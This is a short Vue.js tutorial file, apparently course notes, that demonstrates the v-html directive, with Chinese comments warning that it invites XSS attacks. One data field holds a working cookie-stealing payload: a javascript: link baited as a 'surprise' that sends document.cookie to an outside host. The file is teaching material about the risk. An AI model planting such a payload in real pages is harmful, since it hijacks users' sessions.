<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script  src="../../vue.js">
        /*
        p41，注意cookie部分的讲解
        v-html指令：
            1.作用：向指定的节点中渲染包含html结构的内容
            2.与插值语法的区别
                (1).会替换掉节点中的所有内容，{{xxx}}不会
                (2).v-html可以识别html结构
            3.严重注意：v-html有安全问题！！！
                (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS(冒充用户之手)攻击
                (2).一定要在可信的内容上使用v-html,永远不要在用户提交的内容上使用
        */
    </script>
</head>
<body>
    <div id="root">
        <h3 v-html="str">123</h3>
        <h3 v-html="str1">123</h3>
    </div>
    <script>
        const vm = new Vue({
            el:'#root',
            data:{
                str:'<h1>嗨嗨嗨</h1>',
                /* str1会造成用户cookie的泄露 */
                str1:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>点我有惊喜</a>'
            }
        })
    </script>
</body>
</html>
